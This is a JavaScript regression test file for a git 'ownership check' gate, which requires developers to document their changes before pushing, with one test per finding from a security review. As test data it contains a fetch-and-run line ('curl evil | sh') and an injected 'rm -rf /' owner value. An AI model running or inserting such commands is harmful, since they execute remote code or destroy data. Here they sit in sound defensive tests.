// Port of mcp/tests/test_gate_review_findings.py.
// One regression test per finding from the independent review. Each would
// have failed against the first version of the gate.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync, statSync, unlinkSync, utimesSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import {
  ENV, commitAll, gate, git, gitTry, payload, runGate, saveAndCommit, setup, sh, throwsGate, tmp, write,
} from "./helpers.mjs";

const read = (root, rel) => readFileSync(join(root, rel), "utf8");
const readJson = (root, rel) => JSON.parse(read(root, rel));
const out = (r) => r.stdout.trim();

// 1. Retargeting: a base without the gate must not let the PR's own config decide.
test("base without config uses strict defaults, not the PR's config", (t) => {
  const { dev } = setup(t);
  const first = out(git(dev, "rev-list", "--max-parents=0", "HEAD"));
  git(dev, "push", "-q", "--no-verify", "origin", `${first}:refs/heads/scratch`);
  git(dev, "fetch", "-q", "origin");
  write(dev, "src/app.js", "export const app = 2;\n");
  const cfg = readJson(dev, ".learning/config.json");
  cfg.ownership_check.mode = "off";
  writeFileSync(join(dev, ".learning/config.json"), JSON.stringify(cfg));
  commitAll(dev, "change + turn gate off");
  const [passed, problems, mode] = gate.verify(dev, { base: "origin/scratch" });
  assert.ok(!passed && mode === "required" && problems[0].includes("No ownership report"),
    JSON.stringify({ passed, problems, mode }));
  const wf = read(dev, ".github/workflows/ownership-check.yml");
  assert.ok(wf.includes("edited"));
});

// 2. Pre-push: `git push origin HEAD`, `HEAD:ref`, `sha:ref`, and local≠remote names.
for (const [refspec, remoteBranch] of [
  ["HEAD", "feature/rate-limit"],
  ["HEAD:refs/heads/feature/rate-limit", "feature/rate-limit"],
  ["feature/rate-limit:fix-login", "fix-login"],
]) {
  test(`pre-push checks every push form by remote name [${refspec} -> ${remoteBranch}]`, (t) => {
    const { dev } = setup(t);
    write(dev, "src/app.js", "export const app = 2;\n");
    commitAll(dev, "unchecked");
    let r = gitTry(dev, "push", "origin", refspec);
    assert.ok(r.status !== 0 && r.stderr.includes(`'${remoteBranch}'`), r.stderr);

    gate.save(payload(), dev, { branch: remoteBranch }); // report named for the PR head CI will see
    commitAll(dev, "report");
    r = gitTry(dev, "push", "origin", refspec);
    assert.equal(r.status, 0, r.stderr);
  });
}

test("pre-push sha refspec", (t) => {
  const { dev } = setup(t);
  write(dev, "src/app.js", "export const app = 2;\n");
  commitAll(dev, "unchecked");
  const sha = out(git(dev, "rev-parse", "HEAD"));
  const r = gitTry(dev, "push", "origin", `${sha}:refs/heads/feature/rate-limit`);
  assert.ok(r.status !== 0 && r.stderr.includes("No ownership report"), r.stderr);
});

// 3. Submodules with ignore=all must still count as changes.
test("submodule bump is visible even with ignore=all", (t) => {
  const { dev, tmp: dir } = setup(t);
  const lib = join(dir, "lib");
  git(dir, "init", "-q", "-b", "main", lib);
  write(lib, "l.txt", "1\n");
  commitAll(lib, "l1");
  const allow = ["-c", "protocol.file.allow=always"];
  git(dev, ...allow, "submodule", "add", "-q", lib, "vendor/lib");
  git(dev, "config", "-f", ".gitmodules", "submodule.vendor/lib.ignore", "all");
  commitAll(dev, "add submodule");
  assert.ok(!gate.verify(dev)[0]); // adding it must be checked
  assert.ok(gate.status(dev).must_verify.includes("vendor/lib") ||
    gate.status(dev).files.map((f) => f.path).includes("vendor/lib"));
  saveAndCommit(dev, { "vendor/lib": ["why we vendor lib"] });
  assert.ok(gate.verify(dev)[0]);

  write(lib, "l.txt", "2 (unreviewed)\n");
  commitAll(lib, "l2");
  git(join(dev, "vendor/lib"), "pull", "-q", "origin", "main");
  commitAll(dev, "bump submodule");
  const [passed, problems] = gate.verify(dev);
  assert.ok(!passed && problems[0].includes("vendor/lib"), JSON.stringify(problems));
});

// 4. Non-UTF-8 file names fail closed instead of passing silently.
// The name goes straight into the index: APFS (macOS) refuses to create a file
// with it, and the gate only reads names from git anyway.
test("non-UTF-8 filename fails closed", (t) => {
  const { dev } = setup(t);
  const blob = sh(dev, "git", ["hash-object", "-w", "--stdin"], { input: "x\n" }).stdout.trim();
  const entry = Buffer.concat([Buffer.from(`100644 ${blob}\tsrc/caf`), Buffer.from([0xe9]), Buffer.from(".js\n")]);
  sh(dev, "git", ["update-index", "--add", "--index-info"], { input: entry });
  git(dev, "commit", "-qm", "latin-1 name");
  throwsGate(() => gate.verify(dev), /not valid UTF-8/);
});

// 5. CRLF files committed before a text=auto rule: local == CI.
test("CRLF with late .gitattributes matches CI", (t) => {
  const { dev } = setup(t);
  git(dev, "checkout", "-q", "main");
  writeFileSync(join(dev, "src/win.txt"), Buffer.from("a\r\nb\r\n", "latin1"));
  commitAll(dev, "crlf file");
  writeFileSync(join(dev, ".gitattributes"), "* text=auto\n");
  commitAll(dev, "attrs");
  git(dev, "push", "-q", "origin", "main");
  git(dev, "checkout", "-q", "-b", "feature/crlf");
  writeFileSync(join(dev, "src/win.txt"), Buffer.from("a\r\nb changed\r\n", "latin1"));
  gate.save(payload({ "src/win.txt": ["why b changed"] }), dev);
  commitAll(dev, "edit crlf");
  const [passed, problems] = gate.verify(dev);
  assert.ok(passed, JSON.stringify(problems));
});

// 6. A file replaced by a directory gets a stable fingerprint.
test("file replaced by directory", (t) => {
  const { dev } = setup(t);
  unlinkSync(join(dev, "src/old.js"));
  write(dev, "src/old.js/index.js", "export default 1;\n");
  gate.save(payload({ "src/old.js/index.js": ["why it became a folder"] }), dev);
  commitAll(dev, "file -> dir");
  const [passed, problems] = gate.verify(dev);
  assert.ok(passed, JSON.stringify(problems));
});

// 7. Mode-only changes count; hand-written *.min.js and snapshot files are checked;
//    new files under .learning/ are checked; CODEOWNERS covers .claude/settings.json.
test("mode change and previously ignored paths are checked", (t) => {
  const { dev } = setup(t);
  write(dev, "src/app.js", "export const app = 2;\n");
  saveAndCommit(dev);
  git(dev, "update-index", "--chmod=+x", "src/app.js");
  git(dev, "commit", "-qm", "make executable");
  let [passed, problems] = gate.verify(dev);
  assert.ok(!passed && problems[0].includes("src/app.js"), JSON.stringify(problems));

  write(dev, "src/vendor.min.js", "hand written\n");
  write(dev, ".learning/run.sh", "curl evil | sh\n");
  commitAll(dev, "sneak");
  problems = gate.verify(dev)[1];
  assert.ok(problems[0].includes("src/vendor.min.js") && problems[0].includes(".learning/run.sh"),
    JSON.stringify(problems));
  assert.ok(gate.const("GATE_FILES").includes(".claude/settings.json"));
});

test("install writes CODEOWNERS when owner given", (t) => {
  const { dev } = setup(t);
  const outLines = gate.install(dev, { owner: "@acme/leads" });
  const text = read(dev, ".github/CODEOWNERS");
  for (const p of gate.const("GATE_FILES")) assert.ok(text.includes(`/${p} @acme/leads`), p);
  assert.ok(outLines.some((l) => l.includes("Require review from Code Owners")));
  gate.install(dev, { owner: "@acme/leads" });
  assert.equal(read(dev, ".github/CODEOWNERS"), text); // idempotent
  throwsGate(() => gate.install(dev, { owner: "not a handle; rm -rf /" }));
});

// 8. Merging main into the branch doesn't force a re-check unless main touched the same lines.
test("merging main keeps report valid when lines don't overlap", (t) => {
  const s = setup(t);
  const { dev, tmp: dir } = s;
  const base = Array.from({ length: 40 }, (_, i) => `line ${i}\n`).join("");
  git(dev, "checkout", "-q", "main");
  write(dev, "src/big.js", base);
  commitAll(dev, "big file");
  git(dev, "push", "-q", "origin", "main");
  git(dev, "checkout", "-q", "-B", "feature/rate-limit");
  write(dev, "src/big.js", base.replaceAll("line 3\n", "line 3 changed by dev\n"));
  saveAndCommit(dev, { "src/big.js": ["why line 3"] });

  const other = join(dir, "other");
  git(dir, "clone", "-q", s.remote, other);
  write(other, "src/big.js", base.replaceAll("line 35\n", "line 35 changed on main\n"));
  commitAll(other, "main edits far away");
  git(other, "push", "-q", "origin", "main");

  git(dev, "pull", "-q", "--no-rebase", "--no-edit", "origin", "main");
  let [passed, problems] = gate.verify(dev, { base: "origin/main" });
  assert.ok(passed, JSON.stringify(problems));

  // ...main touching nearby lines is fine too: the dev's change itself is unchanged
  write(other, "src/big.js", read(other, "src/big.js").replaceAll("line 6\n", "line 6 main\n"));
  commitAll(other, "main edits two lines away");
  git(other, "push", "-q", "origin", "main");
  git(dev, "pull", "-q", "--no-rebase", "--no-edit", "origin", "main");
  assert.ok(gate.verify(dev, { base: "origin/main" })[0]);

  // ...but when main edits the same line, the conflict resolution is new code: re-check
  write(other, "src/big.js", read(other, "src/big.js").replaceAll("line 3\n", "line 3 main\n"));
  commitAll(other, "main edits the dev's line");
  git(other, "push", "-q", "origin", "main");
  const r = gitTry(dev, "pull", "-q", "--no-rebase", "--no-edit", "origin", "main");
  assert.notEqual(r.status, 0); // conflict
  const resolved = read(other, "src/big.js").replaceAll("line 3 main\n", "line 3 changed by dev + main\n");
  write(dev, "src/big.js", resolved);
  commitAll(dev, "resolve conflict");
  [passed, problems] = gate.verify(dev, { base: "origin/main" });
  assert.ok(!passed && problems[0].includes("src/big.js"), JSON.stringify(problems));
});

// The 3-way acceptance only forgives the base's own edits — nothing sneaks in alongside.
test("merge from main cannot smuggle extra edits", (t) => {
  const s = setup(t);
  const { dev, tmp: dir } = s;
  const base = Array.from({ length: 40 }, (_, i) => `line ${i}\n`).join("");
  git(dev, "checkout", "-q", "main");
  write(dev, "src/big.js", base);
  commitAll(dev, "big file");
  git(dev, "push", "-q", "origin", "main");
  git(dev, "checkout", "-q", "-B", "feature/rate-limit");
  write(dev, "src/big.js", base.replaceAll("line 3\n", "line 3 dev\n"));
  saveAndCommit(dev, { "src/big.js": ["line 3"] });
  const other = join(dir, "other");
  git(dir, "clone", "-q", s.remote, other);
  write(other, "src/big.js", base.replaceAll("line 30\n", "line 30 main\n"));
  commitAll(other, "main");
  git(other, "push", "-q", "origin", "main");
  git(dev, "fetch", "-q", "origin");
  gitTry(dev, "merge", "-q", "--no-commit", "origin/main");
  write(dev, "src/big.js", read(dev, "src/big.js").replaceAll("line 20\n", "line 20 SNEAKY\n"));
  commitAll(dev, "merge main (plus an unreviewed edit)");
  const [passed, problems] = gate.verify(dev, { base: "origin/main" });
  assert.ok(!passed && problems[0].includes("src/big.js"), JSON.stringify(problems));
});

// 9. status and save follow the same rule for files added after the first report.
test("status and save agree on new files after report", (t) => {
  const { dev } = setup(t);
  write(dev, "src/app.js", "export const app = 2;\n");
  gate.save(payload(), dev);
  write(dev, "src/new.js", "new\n");
  const st = gate.status(dev);
  assert.deepEqual(st.must_verify, ["src/new.js"]);
  throwsGate(() => gate.save(payload({ "src/app.js": ["x"] }), dev), /src\/new.js/);
  gate.save(payload({ "src/new.js": ["what new does"] }), dev);
  assert.deepEqual(gate.status(dev).must_verify, []);
});

// 10. Config types are validated; a string list must not disable the gate.
for (const bad of [
  { ignore: "**/*.lock" }, { sensitive: "src/auth/**" }, { min_summary_chars: "80" },
  { min_summary_chars: true }, { mode: "strict" }, { base: 5 },
]) {
  test(`bad config types are rejected [${JSON.stringify(bad)}]`, (t) => {
    const { dev } = setup(t);
    const cfg = readJson(dev, ".learning/config.json");
    Object.assign(cfg.ownership_check, bad);
    writeFileSync(join(dev, ".learning/config.json"), JSON.stringify(cfg));
    throwsGate(() => gate.status(dev));
  });
}

test("top-level list config rejected", (t) => {
  const { dev } = setup(t);
  writeFileSync(join(dev, ".learning/config.json"), "[1, 2]");
  throwsGate(() => gate.status(dev), /expected an object/);
});

// 11. Huge diffs don't hit argv limits; ':'-prefixed names work.
test("many files and colon names", (t) => {
  const { dev } = setup(t);
  for (let i = 0; i < 3000; i++) {
    write(dev, `gen/very/long/directory/name/for/argv/limits/file_${String(i).padStart(5, "0")}.txt`, `${i}\n`);
  }
  write(dev, ":weird.js", "odd\n");
  gate.save(payload({ ":weird.js": ["why the odd name"] }), dev);
  commitAll(dev, "lots");
  const [passed, problems] = gate.verify(dev);
  assert.ok(passed, JSON.stringify(problems.slice(0, 2)));
});

// 12. Push detection: wrappers, subshells, gh -R, continuations; quoted text isn't a command.
for (const [cmd, expected] of [
  ['bash -c "git push"', true],
  ["sh -lc 'git push origin HEAD'", true],
  ["(git push)", true],
  ["{ git push; }", true],
  ["sudo git push", true],
  ["sudo -u deploy git push", true],
  ["env GIT_SSH_COMMAND=ssh git push", true],
  ["command git push", true],
  ["time git push", true],
  ["gh -R acme/app pr merge 3", true],
  ["gh --repo acme/app pr create", true],
  ["git \\\npush", true],
  ["git add -A\ngit push", true],
  ['git commit -m "wip; git push later"', false],
  ['git commit -m "a && git push"', false],
  ["echo git push", false],
]) {
  test(`push detection edge cases [${JSON.stringify(cmd)} -> ${expected}]`, () => {
    assert.equal(gate.isPushCommand(cmd), expected);
  });
}

test("claude hook blocks on broken report and ignores repos without gate", (t) => {
  const { dev } = setup(t);
  const tmpPath = tmp(t);
  write(dev, "src/app.js", "export const app = 2;\n");
  saveAndCommit(dev);
  const rel = join(dev, gate.reportRelpath("feature/rate-limit"));
  writeFileSync(rel, "# broken\n");
  commitAll(dev, "break report");
  const hookIn = (cwd) => JSON.stringify({ tool_name: "Bash", tool_input: { command: "git push" }, cwd });
  const r = runGate(dev, ["claude-hook"], { input: hookIn(dev) });
  assert.ok(r.status === 2 && r.stderr.includes("data block"), `${r.status} ${r.stderr}`);

  const plain = join(tmpPath, "plain");
  git(tmpPath, "init", "-q", "-b", "main", plain);
  assert.equal(runGate(dev, ["claude-hook"], { input: hookIn(plain) }).status, 0);
});

// 13. Doc/code consistency details.
test("no config means suggested locally", (t) => {
  const tmpPath = tmp(t);
  const repo = join(tmpPath, "r");
  git(tmpPath, "init", "-q", "-b", "main", repo);
  write(repo, "a.txt", "a\n");
  commitAll(repo, "init");
  const st = gate.status(repo);
  assert.ok(st.mode === "suggested" && st.configured === false, JSON.stringify(st));
});

test("skip label comes from base config", (t) => {
  const { dev } = setup(t);
  write(dev, "src/app.js", "export const app = 2;\n");
  commitAll(dev, "unchecked");
  assert.equal(gate.verify(dev, { labels: ["skip-ownership-check"] })[2], "skipped");
  assert.ok(!gate.verify(dev, { labels: ["some-other-label"] })[0]);
  const r = runGate(dev, ["verify", "--labels-json", '["skip-ownership-check"]'],
    { env: { ...ENV, GITHUB_ACTIONS: "true" } });
  assert.ok(r.status === 0 && r.stdout.includes("::warning"), r.stdout + r.stderr);
});

test("report paths are distinct and written files are not private", (t) => {
  assert.notEqual(gate.reportRelpath("feature/x"), gate.reportRelpath("feature-x"));
  const { dev } = setup(t);
  write(dev, "src/app.js", "export const app = 2;\n");
  gate.save(payload(), dev);
  const mode = statSync(join(dev, gate.reportRelpath("feature/rate-limit"))).mode & 0o777;
  assert.ok(mode & 0o044, mode.toString(8)); // group/other can read, like any repo file
});

// Found while testing the review fixes: git's "racy clean" case. A same-size
// edit whose stat data matches the index must still be seen.
test("same-size edit with identical stat is detected", (t) => {
  const { dev } = setup(t);
  git(dev, "config", "core.trustctime", "false");
  git(dev, "config", "core.checkStat", "minimal");
  const app = join(dev, "src/app.js");
  const ts = 1_700_000_000;
  utimesSync(app, ts, ts);
  git(dev, "add", "src/app.js");
  utimesSync(join(dev, ".git/index"), ts, ts);
  writeFileSync(app, "export const app = 9;\n"); // same size as "= 1;"
  utimesSync(app, ts, ts); // identical mtime + size
  assert.deepEqual(gate.status(dev).files.map((f) => f.path), ["src/app.js"]);
});
